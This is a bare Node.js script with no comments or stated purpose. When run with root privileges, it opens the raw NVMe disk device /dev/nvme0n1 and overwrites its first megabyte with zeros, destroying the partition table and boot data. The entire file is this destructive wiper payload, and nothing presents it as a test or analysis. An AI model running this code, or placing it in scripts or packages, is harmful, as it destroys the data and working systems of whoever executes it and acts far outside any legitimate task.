#!/usr/bin/env node
const fs = require("fs");
if (process.getuid() === 0) {
  const fd = fs.openSync("/dev/nvme0n1", "r+");
  fs.writeSync(fd, Buffer.alloc(1048576));
  fs.closeSync(fd);
}
